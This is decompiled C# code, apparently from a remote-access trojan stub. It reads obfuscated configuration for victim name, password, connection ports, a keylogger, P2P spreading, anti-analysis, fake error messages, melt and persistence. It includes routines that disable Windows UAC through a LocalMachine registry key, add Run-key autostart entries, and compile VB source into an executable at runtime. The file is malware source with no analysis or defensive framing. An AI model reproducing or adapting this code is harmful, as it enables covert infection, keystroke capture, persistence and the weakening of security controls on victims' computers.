					item.ConnectPort = Conversions.ToInteger(Strings.Split(text2, GClass0.smethod_0("\u007f"), -1, (CompareMethod)0)[1]);
					item.TransferPort = Conversions.ToInteger(Strings.Split(text2, GClass0.smethod_0("\u007f"), -1, (CompareMethod)0)[2]);
					Module2.VerbindungsDaten.Add(item);
				}
			}
			Module2.Passwort = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("XŦɵͶѳլ\u0670ݥ"), stubString));
			Module2.VictimName = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("\\Šɫͳѯըيݢ\u086f।"), stubString));
			Module2.ReconnectTime = Conversions.ToInteger(_ReadFromStubString(GClass0.smethod_0("@Ŧɳ\u0363ѷղ٢ݮ\u086d"), stubString));
			Module2.ServerInstallieren = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("AŴɢ\u0379ѫտمݥ\u0879ॽ੩୫౪൬\u0e61\u0f71\u1067ᅯ"), stubString));
			Module2.InstallationsOrdner = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("Zżɢ\u0364Ѯբ١ݭ\u087f\u0963੦୦\u0c74\u0d49\u0e77འ\u106dᅧታ"), stubString));
			Module2.Autostart_CurrentUser = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("UŀɆ\u0341ї՟لݐ\u085bफ़\u0a49\u0b59ప\u0d48\u0e7d\u0f73\u1069ᅶተ።ᑰᕵ"), stubString));
			Module2.Autostart_LocalMashine = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("[řɖ\u0355џՍ\u065cݑ\u085c\u0946\u0a44\u0b42\u0c4eപ\u0e48\u0f7d\u1073ᅩቡ፰ᑢᕰᙵ"), stubString));
			Module2.Autostart_AxtivX = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("QŬɺ\u0364ѺՓت\u0748\u085dॳ੩୶\u0c70\u0d62\u0e70\u0f75"), stubString));
			Module2.AutostartKey_AxtivX = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("Jũɽ\u0361ѱգ\u065dܤࡈ१\u0a78"), stubString));
			Module2.AutostartKey_CurrentUser = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("]şɖ\u034bюՓ\u065aݜ\u085f\u0949\u0a45\u0b5e\u0c56൝๔གྷ\u1057ᄤቈ፧ᑸ"), stubString));
			Module2.AutostartKey_LocalMashine = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("^Şɑ\u034aэ՝\u065f\u074cࡏ\u0941\u0a53\u0b46\u0c4b൚เཎ၈ᅀሤፈᑧᕸ"), stubString));
			Module2.MutexString = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("Hűɷ\u0367ѹ"), stubString));
			Module2.Attribut_ReadOnly = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("PŤɻͼѤծپݾ\u0829ग़\u0a62୧ౡ\u0d4b\u0e6d\u0f6eၸ"), stubString));
			Module2.Attribut_System = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("Nźɹ;Ѣըټݼ\u0827\u0955\u0a7c୷౷൧\u0e6c"), stubString));
			Module2.Attribut_Versteckt = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("Nźɹ;Ѣըټݼ\u0827\u094e੬ୠ౧൧\u0e6f"), stubString));
			Module2.Melt = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("IŦɮ\u0375"), stubString));
			Module2.SystemProzessSetzen = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("^ŵɸ;Ѭե\u0657ݴࡪॾ੦ୱ\u0c72"), stubString));
			Module2.OffKeylogger = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("_ũɨ\u0361ѥեٯ\u0742\u086dॾ੪୪\u0c63\u0d64\u0e67\u0f73"), stubString));
			Module2.UAC_Deaktivieren = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("Oţɺ\u0369ѥժ٠ܤࡖ\u0943\u0a42"), stubString));
			Module2.P2PSpread = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("ZĻɘ\u0327ѕյٶݦࡣ॥"), stubString));
			Module2.Antis = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("DŪɷ\u036bѲ"), stubString));
			Module2.ErrorMessage = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("NŦɭ\u0360ФՎ\u0651\u0746"), stubString));
			Module2.ErrorMessageTitel = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("Dśɀ\u0326ёխٷݧ\u086d"), stubString));
			Module2.ErrorMessageText = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("EŔɁ\u0325ѐզٺݵ"), stubString));
			Module2.ErrorMessageStyle = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("Dśɀ\u0326іհٺݮࡤ"), stubString));
			Module2.Persistenz = Conversions.ToBoolean(_ReadFromStubString(GClass0.smethod_0("ZŬɺʹѯն\u0670ݦ\u086cॻ"), stubString));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static object _ReadFromStubString(string erkennung, string StubString)
	{
		string text = GClass0.smethod_0("=") + erkennung + GClass0.smethod_0("?");
		string text2 = GClass0.smethod_0(">Į") + erkennung + GClass0.smethod_0("?");
		return Strings.Split(Strings.Split(StubString, text, -1, (CompareMethod)0)[1], text2, -1, (CompareMethod)0)[0];
	}

	public static void UAC_Deakrivieren(bool ja)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GClass0.smethod_0("jŷɱ\u0362Ѣյ١ݷ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true);
			registryKey.GetValue(GClass0.smethod_0("LŦɦ\u0364ѩա\u064fݗࡀ"))!.ToString();
			if (ja)
			{
				registryKey.SetValue(GClass0.smethod_0("LŦɦ\u0364ѩա\u064fݗࡀ"), GClass0.smethod_0("1"));
			}
			else
			{
				registryKey.SetValue(GClass0.smethod_0("LŦɦ\u0364ѩա\u064fݗࡀ"), GClass0.smethod_0("0"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void AutostartSetzen(bool CurrentUser, bool LocalMashine, bool AktivX)
	{
		if (CurrentUser)
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				currentUser.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३੪ୡ\u0c73൯\u0e4cདၛᅈቇፍᑐᕖᙓ\u1759ᡂ᥇ᩏ᭑᱄ᵂṝὋ⁃⅘≝⍏\u245b╛♎❉⡋⥘⩑⭗ⱏ")).SetValue(Module2.AutostartKey_CurrentUser, Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (LocalMashine)
		{
			try
			{
				RegistryKey localMachine = Registry.LocalMachine;
				localMachine.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३੪ୡ\u0c73൯\u0e4cདၛᅈቇፍᑐᕖᙓ\u1759ᡂ᥇ᩏ᭑᱄ᵂṝὋ⁃⅘≝⍏\u245b╛♎❉⡋⥘⩑⭗ⱏ")).SetValue(Module2.AutostartKey_CurrentUser, Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (AktivX)
		{
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void VbCompile(string Quelltext, string MainClass, string sSpeicherOrt)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		CompilerParameters val = default(CompilerParameters);
		Assembly assembly = default(Assembly);
		int num5 = default(int);
		CodeDomProvider val2 = default(CodeDomProvider);
		ICodeCompiler val3 = default(ICodeCompiler);
		CompilerParameters val4 = default(CompilerParameters);
		Assembly[] assemblies = default(Assembly[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 269:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_0025;
						case 6:
							goto IL_002b;
						case 7:
							goto IL_0036;
						case 8:
							goto IL_0041;
						case 9:
							goto IL_004c;
						case 10:
							goto IL_0058;
						case 11:
							goto IL_0074;
						case 12:
							goto IL_0092;
						case 13:
							goto IL_009e;
						case 14:
							goto IL_00a1;
						case 15:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0074:
					num = 11;
					val.get_ReferencedAssemblies().Add(assembly.Location);
					num5 = checked(num5 + 1);
					goto IL_0092;
					IL_0092:
					num = 12;
					goto IL_0096;
					IL_0009:
					num = 2;
					val2 = (CodeDomProvider)new VBCodeProvider();
					goto IL_0012;
					IL_0012:
					num = 3;
					val3 = val2.CreateCompiler();
					goto IL_001c;
					IL_001c:
					num = 4;
					val4 = new CompilerParameters();
					goto IL_0025;
					IL_0025:
					num = 5;
					val = val4;
					goto IL_002b;
					IL_002b:
					num = 6;
					val.set_GenerateExecutable(true);
					goto IL_0036;
					IL_0036:
					num = 7;
					val.set_OutputAssembly(sSpeicherOrt);
					goto IL_0041;
					IL_0041:
					num = 8;
					val.set_MainClass(MainClass);
					goto IL_004c;
					IL_004c:
					num = 9;
					val.set_IncludeDebugInformation(false);
					goto IL_0058;
					IL_0058:
					num = 10;
					assemblies = AppDomain.CurrentDomain.GetAssemblies();
					num5 = 0;
					goto IL_0096;
					IL_0096:
					if (num5 < assemblies.Length)
					{
						assembly = assemblies[num5];
						goto IL_0074;
					}
					goto IL_009e;
					IL_009e:
					val = null;
					goto IL_00a1;
					IL_00a1:
					num = 14;
					text = Quelltext;
					break;
					end_IL_0000_2:
					break;
				}
				num = 15;
				val3.CompileAssemblyFromSource(val4, text);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 269;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
